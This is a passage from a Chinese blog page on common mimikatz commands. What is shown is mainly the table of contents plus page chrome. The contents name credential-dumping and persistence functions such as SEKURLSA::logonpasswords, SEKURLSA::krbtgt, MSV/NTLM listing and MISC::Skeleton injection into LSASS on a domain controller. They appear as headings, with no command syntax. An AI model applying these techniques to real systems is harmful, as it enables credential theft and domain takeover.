href="#MISC-ncroutemon-juiper%E7%AE%A1%E7%90%86%E5%99%A8%EF%BC%88%E6%B2%A1%E6%9C%89DisableTaskMgr%EF%BC%89"><span class="toc-number">8.0.6.</span> <span class="toc-text">MISC::ncroutemon - juiper管理器（没有DisableTaskMgr）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-regedit-%E6%89%93%E5%BC%80%E6%B3%A8%E5%86%8C%E8%A1%A8%EF%BC%88%E6%B2%A1%E6%9C%89DisableRegistryTools%EF%BC%89"><span class="toc-number">8.0.7.</span> <span class="toc-text">MISC::regedit - 打开注册表（没有DisableRegistryTools）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-Skeleton-%E5%9C%A8%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E4%B8%8A%E6%B3%A8%E5%85%A5%E4%B8%80%E4%B8%AASekeleton-key%E5%88%B0LSASS%E8%BF%9B%E7%A8%8B"><span class="toc-number">8.0.8.</span> <span class="toc-text">MISC::Skeleton - 在域控制器上注入一个Sekeleton key到LSASS进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MISC-TASKMGR-%E6%89%93%E5%BC%80%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">8.0.9.</span> <span class="toc-text">MISC::TASKMGR - 打开任务管理器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-MINESWEEPER"><span class="toc-number">9.</span> <span class="toc-text">7.MINESWEEPER</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MINESWEEPER-INFOS-%E6%8F%90%E4%BE%9Bminesweeper%E7%9A%84mine%E4%BF%A1%E6%81%AF"><span class="toc-number">9.0.1.</span> <span class="toc-text">MINESWEEPER::INFOS - 提供minesweeper的mine信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-NET"><span class="toc-number">10.</span> <span class="toc-text">8.NET</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NET-user-%E5%88%97%E5%87%BA%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E6%89%80%E5%B1%9E%E7%BB%84"><span class="toc-number">10.0.1.</span> <span class="toc-text">NET::user - 列出用户名及所属组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NET-GROUP"><span class="toc-number">10.0.2.</span> <span class="toc-text">NET::GROUP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NET-LOCALGROUP"><span class="toc-number">10.0.3.</span> <span class="toc-text">NET::LOCALGROUP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-PEIVILEGE"><span class="toc-number">11.</span> <span class="toc-text">9.PEIVILEGE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-DEBUG-%E8%8E%B7%E5%BE%97debug%E6%9D%83%E9%99%90"><span class="toc-number">11.0.1.</span> <span class="toc-text">PRIVILEGE::DEBUG - 获得debug权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-BACKUP-%E5%A4%87%E4%BB%BD%E4%B8%80%E4%B8%AA%E6%9D%83%E9%99%90"><span class="toc-number">11.0.2.</span> <span class="toc-text">PRIVILEGE::BACKUP - 备份一个权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-DRIVER-%E8%8E%B7%E5%BE%97%E9%A9%B1%E5%8A%A8%E6%9D%83%E9%99%90"><span class="toc-number">11.0.3.</span> <span class="toc-text">PRIVILEGE::DRIVER - 获得驱动权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-ID-%E8%8E%B7%E5%BE%97ID%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">11.0.4.</span> <span class="toc-text">PRIVILEGE::ID - 获得ID所对应的权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-NAME-%E8%8E%B7%E5%BE%97NAME%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">11.0.5.</span> <span class="toc-text">PRIVILEGE::NAME - 获得NAME所对应的权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PRIVILEGE-RESTORE-%E8%8E%B7%E5%BE%97restore%E6%9D%83%E9%99%90"><span class="toc-number">11.0.6.</span> <span class="toc-text">PRIVILEGE::RESTORE - 获得restore权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-PROCESS"><span class="toc-number">12.</span> <span class="toc-text">10.PROCESS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-Exports-%E5%88%97%E5%87%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">12.0.1.</span> <span class="toc-text">PROCESS::Exports - 列出进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-IMPORTS-%E5%88%97%E5%87%BAIMPORTS"><span class="toc-number">12.0.2.</span> <span class="toc-text">PROCESS::IMPORTS - 列出IMPORTS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-list-%E5%88%97%E5%87%BA%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">12.0.3.</span> <span class="toc-text">PROCESS::list - 列出正在运行的进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-RESUME-%E6%81%A2%E5%A4%8D%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B"><span class="toc-number">12.0.4.</span> <span class="toc-text">PROCESS::RESUME - 恢复一个进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-START-%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B"><span class="toc-number">12.0.5.</span> <span class="toc-text">PROCESS::START - 启动一个进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-STOP-%E5%81%9C%E6%AD%A2"><span class="toc-number">12.0.6.</span> <span class="toc-text">PROCESS::STOP - 停止</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PROCESS-SUSPEND-%E6%8C%82%E8%B5%B7"><span class="toc-number">12.0.7.</span> <span class="toc-text">PROCESS::SUSPEND - 挂起</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-SEKURLSA"><span class="toc-number">13.</span> <span class="toc-text">11.SEKURLSA</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-BACKUPKEYS-%E8%8E%B7%E5%8F%96%E9%A6%96%E9%80%89%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%BB%E5%AF%86%E9%92%A5"><span class="toc-number">13.0.1.</span> <span class="toc-text">SEKURLSA::BACKUPKEYS - 获取首选的备份主密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-Credman-%E5%88%97%E5%87%BA%E5%87%AD%E8%AF%81%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">13.0.2.</span> <span class="toc-text">SEKURLSA::Credman - 列出凭证管理器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-Dpapi-%E5%88%97%E5%87%BA%E7%BC%93%E5%AD%98%E7%9A%84masterkeys"><span class="toc-number">13.0.3.</span> <span class="toc-text">SEKURLSA::Dpapi - 列出缓存的masterkeys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-DpapiSystem-DPAPI-SYSTEM-secret"><span class="toc-number">13.0.4.</span> <span class="toc-text">SEKURLSA::DpapiSystem - DPAPI_SYSTEM secret</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-EKEYS-%E5%88%97%E5%87%BAKerberos%E5%8A%A0%E5%AF%86%E5%AF%86%E9%92%A5"><span class="toc-number">13.0.5.</span> <span class="toc-text">SEKURLSA::EKEYS - 列出Kerberos加密密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-KERBEROS-%E5%88%97%E5%87%BA%E5%B7%B2%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E7%9A%84Kerberos%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF%EF%BC%88%E5%8C%85%E6%8B%AC%E7%94%B5%E8%84%91%E8%B4%A6%E6%88%B7%E5%92%8C%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%EF%BC%89"><span class="toc-number">13.0.6.</span> <span class="toc-text">SEKURLSA::KERBEROS - 列出已授权验证用户的Kerberos凭证信息（包括电脑账户和服务账户）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-krbtgt-%E8%8E%B7%E5%8F%96%E5%9F%9FKerberos%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%9A%84%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE"><span class="toc-number">13.0.7.</span> <span class="toc-text">SEKURLSA::krbtgt - 获取域Kerberos服务账号的密码数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-LiveSSP-%E5%88%97%E5%87%BALiveSSP%E5%87%AD%E8%AF%81%E4%BF%A1%E6%81%AF"><span class="toc-number">13.0.8.</span> <span class="toc-text">SEKURLSA::LiveSSP - 列出LiveSSP凭证信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-logonpasswords-%E5%88%97%E5%87%BA%E6%9C%80%E8%BF%91%E7%99%BB%E9%99%86%E8%BF%87%E7%9A%84%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF"><span class="toc-number">13.0.9.</span> <span class="toc-text">SEKURLSA::logonpasswords - 列出最近登陆过的所有用户的密码信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-Minidump-%E5%88%87%E6%8D%A2%E5%88%B0LSASS-minidump%E8%BF%9B%E7%A8%8B%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">13.0.10.</span> <span class="toc-text">SEKURLSA::Minidump - 切换到LSASS minidump进程上下文</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SEKURLSA-MSV-%E5%88%97%E5%87%BALM-amp-NTLM%E5%87%AD%E8%AF%81"><span class="toc-number">13.0.11.</span> <span class="toc-text">SEKURLSA::MSV - 列出LM &amp; NTLM凭证</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/07/30/mimikatz-usage/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2017/07/30/mimikatz-usage/&text=mimikatz常用命令"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/07/30/mimikatz-usage/&is_video=false&description=mimikatz常用命令"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=mimikatz常用命令&body=Check out this article: http://yoursite.com/2017/07/30/mimikatz-usage/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2017/07/30/mimikatz-usage/&title=mimikatz常用命令"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/07/30/mimikatz-usage/&name=mimikatz常用命令&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2017/07/30/mimikatz-usage/&t=mimikatz常用命令"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2020
    lex
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects_url">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
